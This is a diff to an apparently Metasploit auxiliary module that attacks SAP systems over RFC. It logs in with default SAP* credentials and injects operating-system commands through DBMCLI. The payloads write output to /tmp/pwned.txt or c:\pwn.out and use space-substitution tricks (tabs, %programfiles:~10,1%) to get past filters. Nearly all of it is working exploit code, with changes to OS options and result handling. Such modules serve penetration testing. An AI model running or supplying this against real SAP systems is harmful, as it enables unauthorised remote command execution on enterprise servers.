@@ -39,28 +39,34 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'Username', 'SAP*']),
         OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command', 'id']),
-        OptEnum.new('OS', [true, 'Windows/Linux', "Linux", ['Windows','Linux']]),
+        OptEnum.new('OS', [true, 'Windows NT/UNIX', "UNIX", ['UNIX','Windows NT']]),
       ], self.class)
   end
 
   def run_host(rhost)
     user = datastore['USERNAME']
     pass = datastore['PASSWORD']
+    rport = datastore['RPORT']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    os = datastore['OS']
+    os = "ANYOS"
     command = create_payload(1)
-    exec_CMD(user,client,pass,rhost,datastore['rport'],command,os)
+    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['rport'],command,os)
+    if res =~ /External program terminated with exit code/im
+      print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on target host")
+      return
+    end
     command = create_payload(2)
-    exec_CMD(user,client,pass,rhost,datastore['rport'],command,os)
+    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,rport,command,os)
+    print res if res
   end
 
   def create_payload(num)
     command = ""
 
-    if datastore['OS'].downcase == "linux"
+    if datastore['OS'].downcase == "unix"
       if num == 1
         command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
         command << datastore['CMD'].gsub(" ","\t")
@@ -68,14 +74,14 @@ class Metasploit4 < Msf::Auxiliary
       else
         command = "-ic /tmp/pwned.txt"
       end
-    elsif datastore['OS'].downcase == "windows"
+    elsif datastore['OS'].downcase == "windows nt"
       if num == 1
-        command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
+        command = '-o c:\\pwn.out -n pwnsap' + "\r\n!"
         space = "%programfiles:~10,1%"
         command << datastore['COMMAND'].gsub(" ",space)
         # TODO The command should be gsubbed for space?
       else
-        command = '-ic c:\\\pwn.out'
+        command = '-ic c:\\pwn.out'
       end
     end
 
@@ -105,16 +111,11 @@ class Metasploit4 < Msf::Auxiliary
         #  result << data
         #end
 
-        #for i in 0..result.length/2-1
-        #  saptbl << [result[i].chomp]
-        #end
-        #print(saptbl.to_s)
-        print data
+        return data
       rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
+        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
     rescue NWError => e
-      print_error("#{rhost}:#{rport} [SAP] exec_CMD - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
     ensure
       if conn
         conn.disconnect
